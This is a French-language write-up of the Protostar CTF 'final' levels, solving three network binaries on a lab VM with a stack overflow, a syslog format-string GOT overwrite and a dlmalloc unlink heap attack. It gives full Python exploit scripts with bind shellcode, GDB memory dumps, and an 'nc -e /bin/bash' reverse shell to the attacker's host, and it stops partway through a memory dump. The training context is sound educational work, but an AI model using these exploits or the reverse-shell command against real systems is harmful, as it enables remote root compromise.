# Solution du CTF Protostar (final)

On est en finale ! On est en finale ! On est, on est, on est en finale !

Il nous reste trois binaires avant de devenir champion mon ami, chacun écoutant sur un port :

```
tcp        0      0 0.0.0.0:2993            0.0.0.0:*               LISTEN      1529/final2     
tcp        0      0 0.0.0.0:2994            0.0.0.0:*               LISTEN      1527/final1     
tcp        0      0 0.0.0.0:2995            0.0.0.0:*               LISTEN      1525/final0
```

## Final 0

On commence par celui qui concerne un stack overflow :

```c
#include "../common/common.c"

#define NAME "final0"
#define UID 0
#define GID 0
#define PORT 2995

/*
 * Read the username in from the network
 */

char *get_username()
{
  char buffer[512];
  char *q;
  int i;

  memset(buffer, 0, sizeof(buffer));
  gets(buffer);

  /* Strip off trailing new line characters */
  q = strchr(buffer, '\n');
  if(q) *q = 0;
  q = strchr(buffer, '\r');
  if(q) *q = 0;

  /* Convert to lower case */
  for(i = 0; i < strlen(buffer); i++) {
      buffer[i] = toupper(buffer[i]);
  }

  /* Duplicate the string and return it */
  return strdup(buffer);
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID); 

  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  username = get_username();

  printf("No such user %s\n", username);
}
```

La fonction `get_username` est vulnérable car elle utilise la fonction `gets` qui n'est pas limitée sur la lecture et peut donc déborder du buffer de 512 octets.

Si on parvient à écraser l'adresse de retour, le détournement de l'exécution sera déclenché sur la dernière ligne (`return strdup(buffer)`) seulement entre temps plusieurs opérations peuvent altérer notre payload :

- le code utilise `strchr` pour trouver et supprimer les retours à la ligne (CR er LF)

- le code met le buffer en majuscules

On peut facilement vérifier qu'on a le controle sur le registre `eip` en envoyant une suite de A.

```
root@protostar:/home/user# nc 127.0.0.1 2995 -v
127.0.0.1: inverse host lookup failed: Host name lookup failure
(UNKNOWN) [127.0.0.1] 2995 (?) open
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
root@protostar:/home/user# dmesg | tail -1
[1412792.784263] final0[21639]: segfault at 41414141 ip 41414141 sp bffffc60 error 4
```

Reproduisons la même chose mais avec un pattern sans répétitions pour déterminer où pointe `eip` et `esp`.

```python
>>> from pwnlib.util.cyclic import cyclic_gen
>>> g = cyclic_gen()
>>> g.get(700)
b'zaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaak'
>>> # ici on copie la chaine pour l'envoyer sur le port puis on récupère les infos via GDB (voir au dessous)
>>> g.find(0x6a616169)
(932, 1, 532)
```

Avec GDB je m'attache au processus et je spécifie que je veux passer sur le processus fils lors d'un fork :

```shellsession
root@protostar:/opt/protostar/bin# gdb -q
(gdb) attach 1525
Attaching to process 1525
Reading symbols from /opt/protostar/bin/final0...done.
Reading symbols from /lib/libc.so.6...Reading symbols from /usr/lib/debug/lib/libc-2.11.2.so...done.
(no debugging symbols found)...done.
Loaded symbols for /lib/libc.so.6
Reading symbols from /lib/ld-linux.so.2...Reading symbols from /usr/lib/debug/lib/ld-2.11.2.so...done.
(no debugging symbols found)...done.
Loaded symbols for /lib/ld-linux.so.2
accept () at ../sysdeps/unix/sysv/linux/i386/socket.S:64
64      ../sysdeps/unix/sysv/linux/i386/socket.S: No such file or directory.
        in ../sysdeps/unix/sysv/linux/i386/socket.S
Current language:  auto
The current source language is "auto; currently asm".
(gdb) b *0x08049832
Breakpoint 1 at 0x8049832: file final0/final0.c, line 34.
(gdb) set follow-fork-mode child
(gdb) c
Continuing.
[New process 21682]
[Switching to process 21682]

Breakpoint 1, 0x08049832 in get_username () at final0/final0.c:34
34      final0/final0.c: No such file or directory.
        in final0/final0.c
Current language:  auto
The current source language is "auto; currently c".
(gdb) info reg 
eax            0x804b008        134524936
ecx            0x0      0
edx            0x1      1
ebx            0x6a616167       1784766823
esp            0xbffffc5c       0xbffffc5c
ebp            0x6a616168       0x6a616168
esi            0x0      0
edi            0x0      0
eip            0x8049832        0x8049832 <get_username+216>
eflags         0x282    [ SF IF ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) x/s $esp
0xbffffc5c:      "iaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaak"
(gdb) x/s $eax
0x804b008:       "ZAAEBAAECAAEDAAEEAAEFAAEGAAEHAAEIAAEJAAEKAAELAAEMAAENAAEOAAEPAAEQAAERAAESAAETAAEUAAEVAAEWAAEXAAEYAAEZAAFBAAFCAAFDAAFEAAFFAAFGAAFHAAFIAAFJAAFKAAFLAAFMAAFNAAFOAAFPAAFQAAFRAAFSAAFTAAFUAAFVAAFWAAFXAAFYAAF"...
```

Ici j'ai mis un breakpoint sur l'instruction `ret` qui pop l'adresse de retour par conséquent au moment de détourner l'exécution `esp` pointera 4 octets après sa valeur actuelle (offset 536). Le registre `eax` pointe quand à lui sur le début de la chaine que l'on a envoyé.

Je trouve dans le binaire un gadget approprié :

`0x08048d5f : call eax`

On va donc utiliser ce gadget pour écraser l'adresse de retour et le début du payload contiendra un shellcode résistant à `toupper`.

J'ai pris l'option de facilité en utilisant un shellcode trouvé sur *exploit-db* :

[Linux/x86 - Bind (5074/TCP) Shell + ToUpper Encoded Shellcode (226 bytes)](https://www.exploit-db.com/shellcodes/13427)

Mon exploit :

```python
import socket
import struct

# https://www.exploit-db.com/shellcodes/13427
shellcode = (
    "\xeb\x02"
    "\xeb\x05"
    "\xe8\xf9\xff\xff\xff"
    "\x5f"
    "\x81\xef\xdf\xff\xff\xff"
    "\x57"
    "\x5e"
    "\x29\xc9"
    "\x80\xc1\xb8"
    "\x8a\x07"
    "\x2c\x41"
    "\xc0\xe0\x04"
    "\x47"
    "\x02\x07"
    "\x2c\x41"
    "\x88\x06"
    "\x46"
    "\x47"
    "\x49"
    "\xe2\xed"
    "DBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKB"
    "AFBFAIJOBLAGGMNIAEAIJEECEAEEDEDLAGGMNIAIDMEAMFCFCEDLAGGMNIA"
    "JDIJNBLADPMNIAEBIAPJADHFPGFCGIGOCPHDGIGICPCPGCGJIJODFCFDIJO"
    "BLAALMNIA"
)
call_eax = 0x08048d5f

sock = socket.socket()
sock.connect(("192.168.56.95", 2995))
sock.send(shellcode + "A" * (532 - len(shellcode)) + struct.pack("<I", call_eax))
```

Et on obtient bien un shell root sur le port 5074 :

```shellsession
$ ncat 192.168.56.95 5074 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.95:5074.
id
uid=0(root) gid=0(root) groups=0(root)
echo $$ 
21713
pstree -ap | grep -B5 21713 
  |-atd,1204
  |-cron,1283
  |-dhclient,1626 -v -pf /var/run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases eth0
  |-exim4,1505 -bd -q30m
  |-final0,1525
  |   `-sh,21713
  |       |-grep,21724 -B5 21713
```

## Final 1

NB: Je n'entre pas ici dans les détails de l'exploitation des chaines de format, veuillez lire [Pwing echo : Exploitation d'une faille de chaîne de format](https://devloop.users.sourceforge.net/index.php?article102/pwing-echo-exploitation-d-une-faille-de-chaine-de-format) pour comprendre les mécanismes permettant d'écrire la valeur que l'on souhaite à l'adresse que l'on souhaite.

Il s'agit ici de l'exploitation d'une chaine de format. Pas de `printf` ici mais un `syslog` :

```c
#include "../common/common.c"

#include <syslog.h>

#define NAME "final1"
#define UID 0
#define GID 0
#define PORT 2994

char username[128];
char hostname[64];

void logit(char *pw)
{
  char buf[512];

  snprintf(buf, sizeof(buf), "Login from %s as [%s] with password [%s]\n", hostname, username, pw);

  syslog(LOG_USER|LOG_DEBUG, buf);
}

void trim(char *str)
{
  char *q;

  q = strchr(str, '\r');
  if(q) *q = 0;
  q = strchr(str, '\n');
  if(q) *q = 0;
}

void parser()
{
  char line[128];

  printf("[final1] $ ");

  while(fgets(line, sizeof(line)-1, stdin)) {
      trim(line);
      if(strncmp(line, "username ", 9) == 0) {
          strcpy(username, line+9);
      } else if(strncmp(line, "login ", 6) == 0) {
          if(username[0] == 0) {
              printf("invalid protocol\n");
          } else {
              logit(line + 6);
              printf("login failed\n");
          }
      }
      printf("[final1] $ ");
  }
}

void getipport()
{
  int l;
  struct sockaddr_in sin;

  l = sizeof(struct sockaddr_in);
  if(getpeername(0, &sin, &l) == -1) {
      err(1, "you don't exist");
  }

  sprintf(hostname, "%s:%d", inet_ntoa(sin.sin_addr), ntohs(sin.sin_port));
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID); 

  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  getipport();
  parser();

}
```

La méthode attendue est d'exploiter le binaire en aveugle puisqu'on ne dispose pas d'un accès sur `/var/log/syslog`. Grosso modo on tente d'écrire à une adresse et si ça crashe c'est que l'on fait fausse route. On a toutefois accès au binaire donc on peut le copier chez nous et lire notre fichier `syslog`.

Ainsi en faisant afficher en hexa les différents dwords sur la stack je remarque qu'en position 7 se trouve le début de la chaine formée (*Login from*...)

Et finalement en position 15 :

```
[final1] $ username pAAAA
[final1] $ login %15$08x
login failed
```

Je parviens à obtenir la réflection du nom d'utilisateur (j'exploite ici l'injection de la chaine de format via le password) :

```
2023-01-27T10:08:16.185284+01:00 linux-vyoc final1: Login from 127.0.0.1:56992 as [pAAAA] with password [41414141]
```

Petit problème: en local j'ai l'IP `127.0.0.1` mais sur la machine du CTF ce sera `192.168.56.1` soit 3 octets de plus, il faut finalement recaler et aller chercher sur les offsets 16 et 17.

La fonction `strchr` est une bonne candidate pour être écrasée. Comme le code fait une boucle infinie dans la fonction `parser` et appelle `trim` qui appelle `strchr` sur le buffer reçu je peux obtenir une exécution de commande fiable si je remplace son adresse dans la `GOT` par celle de `system`.

L'adresse de `system` dans la libc est `0xb7ecffb0`. Les adresses ne sont pas randomisées.

Avant d'atteindre la chaine de format, 53 octets sont déjà écrits via le Login from `192.168.56.1...`

Je vais utiliser une chaine de format pour écraser l'adresse de `strchr` en deux fois (en écrasant deux shorts, un short équivaut deux octets).

D'abord écraser le short le plus petit soit la valeur `0xb7ec` (`47084`) puis le plus grand, `0xffb0` (`65456`).

Comme je rajoute l'adresse du second short dans ma chaine de format je doit déduire 4 octets de plus donc 57 octets déjà écrits et non plus 53.

Il me reste à écrire `47084 - 57 = 47027` octets. Cette valeur sera écrasée dans le premier short via le format `%15$hn`.

Il faut ensuite que de déduise cela pour le second short soit `65456 - 47027 = 18429` octets qui sera écrasé en prenant l'adresse présente à l'offset qui suit (`%16$hn`).

L'adresse de `strchr` dans la `GOT` est `0x804a12c`.

J'aurais à envoyer un username de cette façon : `username p\x2c\xa1\x04\x08\x2e\xa1\x04\x08`

Et le login ressemblera à ceci : `login %47027x%15$hn%18429x%16$hn`

Ca fonctionne en local mais sur l'instance du CTF j'ai dû adapter un peu. Le fait que l'adresse IP ne soit pas la même implique de modifier le padding, du coup voici l'exploit final :

```python
import socket                                                                                                          
import struct                                                                                                          

strchr = 0x804a12c                                                                                                     
sock = socket.socket()                                                                                                 
sock.connect(("192.168.56.95", 2994))                                                                                  
sock.recv(1024)                                                                                                        
sock.send("username pp" + struct.pack("<II", strchr + 2, strchr) + "\n")                                               
sock.recv(1024)                                                                                                        
sock.send("login %47023x%16$hn%18372x%17$hn" + "\n")                                                                   
sock.recv(1024)                                                                                                        
sock.recv(1024)                                                                                                        
sock.send("nc -e /bin/bash 192.168.56.1 4444 -v\n")                                                                    
sock.recv(1024
```

Et ça fonctionne :

```shellsession
$ ncat -l -p 4444 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.56.95.
Ncat: Connection from 192.168.56.95:45652.
id
uid=0(root) gid=0(root) groups=0(root)
```

## Final 2

Bien sûr sur ce dernier exercice on est en présence d'un heap overflow et il nous faudra écraser les métadonnées de chunk pour exploiter une faille unlink dlmalloc.

Pour plus d'informations sur le fonctionnement de malloc et l'exploitation de cette faille  il est péférable que vous lisiez d'abord [Solution du CTF Protostar heap3](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Protostar%20(heap).md#level-3).

Le code source du CTF est ici : [Final Two :: Andrew Griffiths' Exploit Education](https://exploit.education/protostar/final-two/). Le code ne révèle pas toute la réalité : le programme consiste en une grosse boucle qui lit des blocs de 128 octets sur le réseau. A chaque fois il copie les données vers un nouveau chunk alloué et vérifie que la taille reçue est bien de 128 et qu'un entête `FSRD` est présent.

Ce que le code ne montre pas (mais que l'on devine aisément) c'est que l'adresse de chaque zone allouée est stockée dans un tableau nommé `destroylist` qui est effectivement énuméré à la fin pour libérer les chunks dans l'ordre où ils ont été créés.

C'est un point important car ça signifie que lors de la libération du premier chunk cela va modifier le flag `prev in use` stocké dans l'indicateur de taille du second chunk et définir aussi son entrée `prev size` (donc potentiellement écraser ce qu'on a mis en place).

Le programme lisant strictement 128 octets, comment dépasser en dehors de la zone allouée ? C'est possible grace à la fonction `check_path` qui modifie un chemin de fichier en recopiant le nom de fichier (ce qui se trouve après le dernier slash) à la position du slash qui précéde la mention `ROOT`.

C'est assez complexe à expliquer alors j'ai préféré reprendre la fonction dans un nouveau programme qui prend deux paramètres :

```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

void check_path(char *buf)
{
  char *start;
  char *p;
  int l;

  /*
  * Work out old software bug
  */

  p = rindex(buf, '/');
  l = strlen(p);
  if(p) {
      start = strstr(buf, "ROOT");
      if(start) {
          while(*start != '/') start--;
          memmove(start, p, l);
          printf("moving %d bytes from %p to %p (exploit: %s / %d)\n", l, p, start, start < buf ? "yes" : "no", start - buf);
      }
  }
  printf("buff = %s\n", buf);
}

int main(int argc, char *argv[]) {
  char *path1 = malloc(128);
  char *path2 = malloc(128);
  strncpy(path1, argv[1], 128);
  strncpy(path2, argv[2], 128);
  check_path(path1);
  check_path(path2);
  printf("path1 = %s\n", path1);
  printf("path2 = %s\n", path2);
  free(path1);
  free(path2);
  return 0;
}
```

Il suffit de faire en sorte que aucun slash ne précéde le mot `ROOT` dans le second chunk pour que le code remonte en mémoire (à cause de la ligne `while(*start != '/') start--;`) et pointe à la fin de notre précédent chunk.

Là il va y copier ce qu'il considère être le nom du fichier donc on a intérêt à avoir un nom de fichier bien long pour écraser le maximum de données :

```
./check_path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/ROOT/ ROOT/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
moving 5 bytes from 0x1ad831b to 0x1ad831b (exploit: no / 123)
buff = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/ROOT
moving 124 bytes from 0x1ad8334 to 0x1ad831b (exploit: yes / -21)
buff = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
path1 = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
path2 = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
munmap_chunk(): invalid pointer
Abandon (core dumped)
```

Pour le binaire du challenge je peux me servir du code suivant pour remplir la mémoire :

```python
import socket
import string

sock = socket.socket()
sock.connect(("127.0.0.1", 2993))
sock.send("FSRDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/ROOT/")
sock.send("FSRDROOT/" + ''.join(c*4 for c in string.letters[:29]) + "ZZZ")
sock.send("STOP")
print(sock.recv(2048))
print(sock.recv(2048))
```

J'envoie d'abord `FSRD` suvi de 118 `A` puis `/ROOT/`. Un chunk est alloué :

```
(gdb) x/80wx 0x0804e000
0x804e000:      0x00000000      0x00000089      0x44525346      0x41414141 <- 0x88 est la taille du premier chunk + flag prev in use à 1
0x804e010:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e020:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e030:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e040:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e050:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e060:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e070:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e080:      0x522f4141      0x2f544f4f      0x00000000      0x00000f79 <- top chunk
0x804e090:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0a0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0f0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e100:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e110:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e120:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e130:      0x00000000      0x00000000      0x00000000      0x0000000
```

puis j'envoie le second buffer composé des caractères de l'alphabet par bloc de 4, le chunk est alloué et les données copiées aussi :

```
(gdb) x/80wx 0x0804e000
0x804e000:      0x00000000      0x00000089      0x44525346      0x41414141
0x804e010:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e020:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e030:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e040:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e050:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e060:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e070:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e080:      0x522f4141      0x2f544f4f      0x00000000      0x00000089 <- second chunk de taille 0x88 + flag prev in use à 1
0x804e090:      0x44525346      0x544f4f52      0x6161612f      0x62626261 <- on voit le début de l'alphabet avec 0x61 mais décalé avec le header
0x804e0a0:      0x63636362      0x64646463      0x65656564      0x66666665
0x804e0b0:      0x67676766      0x68686867      0x69696968      0x6a6a6a69
0x804e0c0:      0x6b6b6b6a      0x6c6c6c6b      0x6d6d6d6c      0x6e6e6e6d
0x804e0d0:      0x6f6f6f6e      0x7070706f      0x71717170      0x72727271
0x804e0e0:      0x73737372      0x74747473      0x75757574      0x76767675
0x804e0f0:      0x77777776      0x78787877      0x79797978      0x7a7a7a79
0x804e100:      0x4141417a      0x42424241      0x43434342      0x41414143
0x804e110:      0x00000000      0x00000ef1      0x00000000      0x00000000 <- top chunk
0x804e120:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e130:      0x00000000      0x00000000      0x00000000      0x00000000
```

et finalement quand `check_path`  est exécuté :

```
(gdb) x/80wx 0x0804e000
0x804e000:      0x00000000      0x00000089      0x44525346      0x41414141
0x804e010:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e020:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e030:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e040:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e050:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e060:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e070:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e080:      0x522f4141      0x2f544f4f      0x61616161      0x62626262 <- on a écrasé les méta données du second chunk
0x804e090:      0x63636363      0x64646464      0x65656565      0x66666666
0x804e0a0:      0x67676767      0x68686868      0x69696969      0x6a6a6a6a
0x804e0b0:      0x6b6b6b6b      0x6c6c6c6c      0x6d6d6d6d      0x6e6e6e6e
0x804e0c0:      0x6f6f6f6f      0x70707070      0x71717171      0x72727272
0x804e0d0:      0x73737373      0x74747474      0x75757575      0x76767676
0x804e0e0:      0x77777777      0x78787878      0x79797979      0x7a7a7a7a
0x804e0f0:      0x41414141      0x42424242      0x43434343      0x7a414141
0x804e100:      0x4141417a      0x42424241      0x43434342      0x41414143
0x804e110:      0x00000000      0x00000ef1      0x00000000      0x00000000 <- top chunk
0x804e120:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e130:      0x00000000      0x00000000      0x00000000      0x00000000
```

Maintenant que l'on comprend mieux comment on peut écraser un chunk on doit réfléchir à ce qu'on faire comme opération.

Le code C du CTF a cette boucle de libération :

```c
  for(i = 0; i < dll; i++) {
      write(fd, "Process OK\n", strlen("Process OK\n"));
      free(destroylist[i]);
  }
```

Ca m'intéressait d'écraser l'adresse de `strlen` dans la `GOT` mais en regardant le code assembleur on s'apperçoit qu'en fin de compte cet appel a été remplacé par une valeur numérique (potentiellement une optimisation du compilateur).

Du coup il ne nous reste que la fonction `write` que l'on peut écraser car `free` fait partie des symboles inclus dans le binaire (le code de `malloc` n'a pas été linké pour les besoins du CTF).

J'ai écris l'exploit suivant :

```python
import socket
import string
import struct

write_got = 0x804d41c
stage1_addr = 0x804e010
stage1 = "\x68\x18\xe1\x04\x08\xc3"  # push 0x0804e118; ret;
sock = socket.socket()
sock.connect(("192.168.56.95", 2993))
sock.send("FSRDAAAA" + stage1 + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/ROOT/")
buff = "FSRD" + "ROOT/" + "\xfc\xff\xff\xff" + "\xfd\xff\xff\xff" + struct.pack("<I", write_got - 0xc) + struct.pack("<I", stage1_addr)
buff += "A" * (128 - len(buff))
sock.send(buff)

# https://www.exploit-db.com/shellcodes/13360
shellcode = (
    "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
    "\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80"
    "\x89\xc7\x52\x66\x68"
    "\x7a\x69"
    "\x43\x66\x53\x89\xe1\xb0\x10\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80"
    "\xb0\x66\xb3\x04\xcd\x80"
    "\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80"
    "\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80"
    "\x41\xe2\xf8\x51\x68n/sh\x68//bi\x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80"
)
sock.send(shellcode)
print(sock.recv(2048))
print(sock.recv(2048))
```

Il écrase le second chunk pour un chunk affiché comme étant de taille -4 et avec le flag `prev in use` à 1 ce qui donne `0xfffffffd`.

La taille du chunk précédent est marquée à -4 soit `0xfffffffc`.

J'ai un `stage` qui consiste à pousser l'adresse  `0x0804e118` et à sauter dessus via un `ret`. Il est présent à l'adresse `0x804e010` (l'ASLR est désactivée).

A l'adresse `0x0804e118` se trouvent notre shellcode présent dans le 3ème chunk.

Voici la structure mémoire du binaire aux différentes étapes de l'exploitation.

**Deux chunks présents avant l'appel à check_path**

```
0x804e000:      0x00000000      0x00000089      0x44525346      0x41414141
0x804e010:      0x04e11868      0x4141c308      0x41414141      0x41414141 <- notre stage1 en début de ligne
0x804e020:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e030:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e040:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e050:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e060:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e070:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e080:      0x522f4141      0x2f544f4f      0x00000000      0x00000089
0x804e090:      0x44525346      0x544f4f52      0xfffffc2f      0xfffffdff <- on apperçoit le fake chunk mais pas encore positionné
0x804e0a0:      0x04d410ff      0x04e01008      0x41414108      0x41414141
0x804e0b0:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e0c0:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e0d0:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e0e0:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e0f0:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e100:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e110:      0x00000000      0x00000ef1      0x00000000      0x00000000
0x804e120:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e130:      0x00000000      0x00000000      0x00000000      0x00000000
```

**Fake chunk recalé**

```
(gdb) x/80wx 0x0804e000
0x804e000:      0x00000000      0x00000089      0x44525346      0x41414141
0x804e010:      0x04e11868      0x4141c308      0x41414141      0x41414141
0x804e020:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e030:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e040:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e050:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e060:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e070:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e080:      0x522f4141      0x2f544f4f      0xfffffffc      0xfffffffd <- flag prev in use à 1
0x804e090:      0x0804d410      0x0804e010      0x41414141      0x41414141
0x804e0a0:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e0b0:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e0c0:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e0d0:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e0e0:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e0f0:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e100:      0x41414141      0x41414141      0x41414141      0x41414141
0x804e110:      0x00000000      0x00000ef1      0x00000000      0x00000000
0x804e120:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e130:      0x00000000      0x00000000      0x00000000      0x00000000
```

**Insertion du shellcode dans le 3ème chunk**

```
(gdb) x/80wx 0x0804e000
